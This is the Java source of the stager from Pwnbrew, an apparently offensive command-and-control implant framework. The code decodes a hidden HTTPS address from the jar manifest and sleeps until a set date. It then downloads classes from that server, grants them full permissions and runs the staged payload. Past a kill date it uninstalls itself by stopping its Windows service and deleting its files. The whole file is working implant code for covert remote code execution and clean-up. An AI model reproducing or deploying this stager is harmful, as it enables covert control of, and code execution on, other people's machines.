/*

Copyright (C) 2013-2014, Securifera, Inc 

All rights reserved. 

Redistribution and use in source and binary forms, with or without modification, 
are permitted provided that the following conditions are met:

    * Redistributions of source code must retain the above copyright notice,
	this list of conditions and the following disclaimer.

    * Redistributions in binary form must reproduce the above copyright notice,
	this list of conditions and the following disclaimer in the documentation 
	and/or other materials provided with the distribution.

    * Neither the name of Securifera, Inc nor the names of its contributors may be 
	used to endorse or promote products derived from this software without specific
	prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS 
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY 
AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER 
OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON 
ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT 
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, 
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

================================================================================

Pwnbrew is provided under the 3-clause BSD license above.

The copyright on this package is held by Securifera, Inc

*/

/*
 * Stager.java
 *
 * Created on Oct 7, 2013, 11:31:44 PM
 */
package stager;

import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.net.URISyntaxException;
import java.net.URL;
import java.net.URLConnection;
import java.security.AllPermission;
import java.security.CodeSource;
import java.security.Permissions;
import java.security.ProtectionDomain;
import java.security.cert.Certificate;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.List;
import java.util.jar.JarFile;

/**
 *
 */
public class Stager extends ClassLoader {

    final protected static char[] hexArray = "0123456789ABCDEF".toCharArray();
    public static String serviceName = ""; 
    public static final SimpleDateFormat CHECKIN_DATE_FORMAT = new SimpleDateFormat("MM/dd/yyyy--HH:mm");
    public static final String DEATH_LABEL ="JAR-ID";
    public static final String SLEEP_LABEL = "JVM-ID";
    public static final String URL = "Private";
    public static final String STAG_PROP_FILE ="META-INF/MANIFEST.MF";
    
    /**
     * @param args the command line arguments
     * @throws java.lang.Exception
     */
    public static void main(String[] args) throws Exception {
        
        //Assign the service name
        if( args.length > 0 )
            serviceName = args[0];        
        
        ManifestProperties localProperties = new ManifestProperties();
        Class localClass = Stager.class;
        
        URL ourUrl = localClass.getProtectionDomain().getCodeSource().getLocation();
        String aStr = ourUrl.toExternalForm();
        
        final URL manifest =  new URL("jar:" + aStr + "!/" + STAG_PROP_FILE);
        URLConnection theConnection = manifest.openConnection();
        InputStream localInputStream = theConnection.getInputStream();
        
        if (localInputStream != null) {
            
            //Load the properties
            localProperties.load(localInputStream);
            localInputStream.close();

            //Get the URL
            String theURL = localProperties.getProperty(URL, null);
            if (theURL != null){

                sun.misc.BASE64Decoder aDecoder = new sun.misc.BASE64Decoder();
                String decodedURL = new String( aDecoder.decodeBuffer(theURL) ).trim();
                if ( decodedURL.startsWith("https:")) {

                    //Create sleep timer
                    SleepTimer aTimer = new SleepTimer(decodedURL);

                    //Get sleep time if it exists
                    String sleepTime = localProperties.getProperty(SLEEP_LABEL, null);
                    if (sleepTime != null){

                        //Start the timer
                        Long aLong = Long.parseLong(sleepTime );
                        Date tmpDate = new Date( aLong ); 

                        aTimer.setIntialSleepDate(tmpDate);
                    }

                    //Get sleep time if it exists
                    String deathDateStr = localProperties.getProperty(DEATH_LABEL, null);
                    if (deathDateStr != null && !deathDateStr.isEmpty()){

                        //Start the timer
                        try {
                            Long aLong = Long.parseLong(deathDateStr );
                            Date tmpDate = new Date( aLong ); 

                            aTimer.setDeathDate(tmpDate);
                        } catch ( NumberFormatException ex ){
                            ex = null;
                        }
                    }


                    //Start timer
                    aTimer.run();

                    //Get the connection
                    URLConnection connection2 = aTimer.getUrlConnection();   
                    if( connection2 != null ){

                        //Get the input stream
                        InputStream theIS = aTimer.getInputStream();
                        OutputStream theOS = new ByteArrayOutputStream();
                
                        Stager theStager = new Stager();
                        theStager.start(theIS, theOS, decodedURL );

                    } else {
                        uninstall();
                    }

                } 

            } 

        }

    }


    //==========================================================================
    /**
     * 
     * @throws URISyntaxException 
     */
    private static void uninstall() throws URISyntaxException {
        
        URL classUrl = Stager.class.getProtectionDomain().getCodeSource().getLocation();
        File theJarFile = new File( classUrl.toURI() ); 
        
        List<String> cleanupList = new ArrayList<String>();
        if( !serviceName.isEmpty() && System.getProperty( "os.name" ).toLowerCase().contains("windows")){
                    
            //Tell the service to stop and restart
            final List<String> strList = new ArrayList<String>();
            strList.add("cmd.exe");
            strList.add("/c");
            strList.add("sc qc \"" + serviceName + "\"");

            //Get the path to the service
            try {
                
                byte[] inputStream = new byte[1024];
                Process aProc = Runtime.getRuntime().exec(strList.toArray( new String[strList.size()] ));
                OutputStream theirStdin = aProc.getOutputStream();
                
                //Close stdin
                theirStdin.close();
            
                //Collect the data from stdout...
                InputStream anIS = aProc.getInputStream();
                StringBuilder aSB = new StringBuilder();
                int bytesRead = 0;
                while( bytesRead != -1){
                    bytesRead = anIS.read(inputStream);
                    if( bytesRead != -1 ){
                        byte[] readArr = Arrays.copyOf(inputStream, bytesRead);
                        aSB.append( new String(readArr));  
                    }                  
                }
                
                //Wait till it completes
                aProc.waitFor(); 
                
                String output = aSB.toString().trim().toLowerCase();
                String theSvcPath = null;
                String[] lines = output.split("\n");
                for( String aLine : lines){
                    if(aLine.contains("binary_path_name")){
                        theSvcPath = aLine.substring( aLine.indexOf(":") + 1).trim();
                        break;
                    }
                }  

                //Stop the svc, Remove the reg entry, delete files
                cleanupList.add("cmd.exe");
                cleanupList.add("/c");

                aSB = new StringBuilder();
                aSB.append("net stop \"").append(serviceName).append("\"");

                if(theSvcPath != null ){
                    aSB.append(" && \"").append(theSvcPath).append("\" -u");
                    aSB.append(" && del \"").append(theSvcPath).append("\"");
                }
                aSB.append(" && del \"").append( theJarFile.getAbsolutePath()).append("\"");                

                cleanupList.add(aSB.toString());
                               
            } catch ( IOException ex ) {
                ex = null;
            } catch (InterruptedException ex) {
                ex = null;
            }                 
            
            try{
                Process aProcess = Runtime.getRuntime().exec(cleanupList.toArray( new String[cleanupList.size()]) );
                aProcess.waitFor();
            } catch(IOException ex ){
                ex = null;
            } catch( InterruptedException ex ){
                ex = null;
            }

        } else {
            
            Class stagerClass = Stager.class;
            ClassLoader aClassLoader = stagerClass.getClassLoader();
           
            LoaderUtilities.unloadLibs( aClassLoader );
            theJarFile.delete();
            
        }

    }
    
    //========================================================================
    /**
     *  Receives the first classes
     * 
     * @param paramInputStream
     * @param paramOutputStream
     * @param passedURL
     */
    private void start(InputStream paramInputStream, OutputStream paramOutputStream, String passedURL ) {
        
        try {
            
            //Prune of the unnecessary data
            DataInputStream localDataInputStream = new DataInputStream(paramInputStream);
            byte msgType = (byte)(localDataInputStream.read() & 0xff );
            if( msgType == 88 ){

                //Skip the message length
                byte[] msglenArr = new byte[4];
                localDataInputStream.read(msglenArr);
                
                //Skip the client id
                byte[] cltId = new byte[4];
                localDataInputStream.read(cltId);
                
                //Get the dest ID
                byte[] dstId = new byte[4];
                localDataInputStream.read(dstId);
                    
                    //Skip the msg id
                    localDataInputStream.skipBytes(4);
                    
                    //Get the classpath length
                    byte[] clsLen = new byte[2];
                    localDataInputStream.read(clsLen);
                    
                    //Convert to int
                    int tempInt = 0;
                    tempInt += (clsLen[0] & 0xff) << (8 * 1);
                    tempInt += (clsLen[1] & 0xff);
                    
                    //Skip the classpath
                    localDataInputStream.skipBytes(tempInt);
                    
                    //Get the type
                    msgType = (byte)(localDataInputStream.read() & 0xff );
                    if( msgType == 32 ){
                        
                        //Get the payload length
                        byte[] payLen = new byte[4];
                        localDataInputStream.read(payLen);
                
                        //Get the payload
                        Permissions localPermissions = new Permissions();
                        localPermissions.add(new AllPermission());
                        ProtectionDomain localProtectionDomain = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), localPermissions);
                        Class localClass;

                        int classLength = localDataInputStream.readInt();
                        do {
                            byte[] arrayOfByte = new byte[classLength];
                            localDataInputStream.readFully(arrayOfByte);
                            resolveClass(localClass = defineClass(null, arrayOfByte, 0, classLength, localProtectionDomain));
                            classLength = localDataInputStream.readInt();
                        }
                        while (classLength > 0);            


                        //Start staged class
                        Object pwnbrewStage = localClass.newInstance();
                        String[] theObjArr = new String[]{passedURL};

                        Method aMethod = localClass.getMethod("start", new Class[] { DataInputStream.class, OutputStream.class, String[].class });
                        aMethod.invoke(pwnbrewStage, new Object[] { localDataInputStream, paramOutputStream, theObjArr });
                        int i =0;
                    }   
            }
        
        } catch (Throwable localThrowable) {
            
            //Write to the byte stream then send back
            localThrowable.printStackTrace();           
            
        } finally {
            
            try {
                paramInputStream.close();
            } catch (IOException ex) {
                ex =null;
            }
            try {
                paramOutputStream.close();
            } catch (IOException ex) {
                ex =null;
            }
        }
        
    }
    
     //===============================================================
    /**
     * 
     * @param value
     * @return 
     */
    public static int byteArrayToInt(byte[] value){

        int tempInt = 0;
        for(int i = 0, j = value.length; i < value.length; i++, j-- ){
            tempInt += (value[i] & 0xff) << (8 * (j - 1));
        }
        return tempInt;

    }   
   

}
